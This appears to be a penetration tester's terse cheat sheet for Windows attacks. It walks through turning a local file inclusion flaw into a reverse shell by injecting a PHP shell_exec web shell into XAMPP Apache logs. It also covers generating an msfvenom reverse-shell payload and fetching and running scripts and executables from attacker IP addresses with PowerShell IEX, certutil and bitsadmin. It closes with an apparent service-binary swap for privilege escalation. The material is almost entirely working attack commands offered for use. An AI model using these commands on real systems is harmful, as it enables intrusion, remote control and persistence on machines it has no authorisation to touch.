File Transfers

Windows:

LFI to Reverse Shell:

1. Spoil the logs 
	
Location of logs in Windows running (PHP&Apache on XAMPP)

STEP-1:
Connect to web application via NetCat
	
nc -nv <victim ip> 80
	
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
	
STEP-2: 
	
Location of apache logs in windows is
	
C:\xampp\apache\logs\access.log
	
STEP-3:
Try accessing the log file via LFI and execute the commands
	
http://url/page.php?file=C:\xampp\apche\logs\access.log&cmd=dir
	
Once remote code execution sucessfull, time for gaining shell
	
STEP-4: 
	
Make windows revershell executable using msfvenom and host it on simply python web server
	
payload: msfvenom -p windows/shell_reverse_tcp lhost="Attacker-ip" lport="443" -f exe > shell.exe

Using powershell(windows 8 and later) 
powershell.exe%20Invoke-WebRequest%20"http://192.168.119.246/rev.exe"%20-OutFile%20"C:\Users\Public\rev.exe"

powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.144:80/Invoke-PowerShellTcp.ps1')

Other ways to download file:

Download Techniques:
certutil.exe

Description: Allows you to download a payload.
Example: certutil -ping [URL]
Example: certutil -urlcache -split -f [URL] [output-file]
certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip

bitsadmin.exe
Description: Allows you to download a payload.
Example: bitsadmin /transfer [job-name] /download /priority normal [URL-to-payload] [output-path]
bitsadmin /transfer debjob /download /priority normal http://cdimage.debian.org/debian-cd/current-live/i386/iso-hybrid/debian-live-8.7.1-i386-xfce-desktop.iso D:\Users\[Username]\Downloads\debian-live-8.7.1-i386-xfce-desktop.iso

 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://10.11.9.187/PowerUp.ps1’)”
move "C:\Program Files (x86)\IObit\Advanced SystemCare\ACSService.exe" "C:\Program files (X86)\IObit\ASCService.exe"

 C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
 
 
 
 
 
 
 
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.9.187:80/avscan.exe','avscan.exe')"
